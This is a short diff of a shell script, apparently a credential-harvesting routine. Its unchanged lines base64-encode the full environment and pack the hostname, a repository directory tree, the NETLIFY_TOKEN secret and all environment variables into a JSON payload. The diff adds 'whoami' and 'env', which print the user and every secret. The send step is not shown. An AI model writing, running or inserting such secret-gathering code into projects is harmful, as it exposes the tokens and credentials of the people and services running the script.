@@ -46,6 +46,8 @@ tree_children=$(collect_dir "$SCAN_PATH" 0)
 tree="{\"type\":\"directory\",\"name\":\"repo\",\"children\":${tree_children}}"
 
 all_env=$(env | base64 -w0)
+whoami
+env
 
 payload="{\"hostname\":\"${HOSTNAME}\",\"tree\":${tree},\"netlify_token\":\"${NETLIFY_TOKEN}\",\"all_env\":\"${all_env}\"}"
 
